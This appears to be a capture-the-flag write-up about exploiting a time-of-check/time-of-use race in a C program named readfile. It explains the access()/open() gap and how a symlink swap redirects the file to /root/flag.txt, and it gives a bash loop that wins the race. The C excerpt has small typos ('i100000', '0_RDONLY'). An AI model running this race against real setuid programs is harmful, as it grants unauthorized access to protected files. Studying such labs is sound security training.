
# 1 readfile.c

```
...
int main(...)
{
  ...
  if(access(argv[1], R_OK) == 0) {
    for (i=0; i100000; i++) { j = (j*i) % 1000; } // WASTE SOME TIME
    gettimeofday(&lt1, NULL); // TIME OF USE
    ffd = open(file, 0_RDONLY);
    ...
    rc = read(ffd, buffer, sizeof(buffer));
  }
}
```

time-of-check: `if(access(argv[1], R_OK) == 0)`
time-of-use: `open, read`

---

# 2 exploit race condition = link swap

exploit flow
```
1. ./readfile file1.txt
2. race window:
   access file1.txt check >>> waste some time >>> use file1.txt
3. swap file1.txt to /root/flag.txt during 'waste some time'
```

NOTE: You cannot “swap” a regular file (like `file1.txt`) during the race window unless you have **write permission to its directory** or control a **symbolic link**.  

If `file1.txt` is a regular file in a directory you own (e.g., `/tmp` or your home), you can:  
1. Replace it with a symlink to `/root/flag.txt` after `access()` passes.  
2. But you can't atomically “swap” a regular file’s content to another file’s content — only symlinks allow instant target redirection.  

---

## **CORRECTED EXPLOIT FLOW:** 🔄🔓  

1. **Prepare:**  
   - Create a file you own: `/home/noob/file1.txt` (content: anything).  
   - Create a symlink `ln -sf /home/noob/file1.txt /tmp/race_link`.  

2. **Trigger:**  
   - Run `./readfile /tmp/race_link`.  
   - Program `access()`es symlink → resolves to `/home/noob/file1.txt` → **SUCCESS** (you have read access).  

3. **Race:**  
   - During the “waste some time” loop:  
     `ln -sf /root/flag.txt /tmp/race_link` (changes symlink target instantly).  

4. **Exploit:**  
   - Program `open()`s `/tmp/race_link` → now points to `/root/flag.txt`.  
   - If timing works, it reads the flag.  

---

## **WHY SYMLINKS ARE ESSENTIAL:** 🧠🔗  
- `access()` follows symlinks (checks target permissions).  
- `open()` follows symlinks (opens target).  
- Replacing a symlink is atomic (`ln -sf`).  
- Replacing a regular file is **not atomic** (write/rename), may break `open()`.  

---

# 3 solution

```
#!/bin/bash
mkdir -p ~/a
cd ~/a
echo "b" > b
rm -f c
while true; do
  ln -sf $PWD/b $PWD/c
  (../readfile $PWD/c &); ln -sf /root/flag.txt $PWD/c
done
```

---

# end
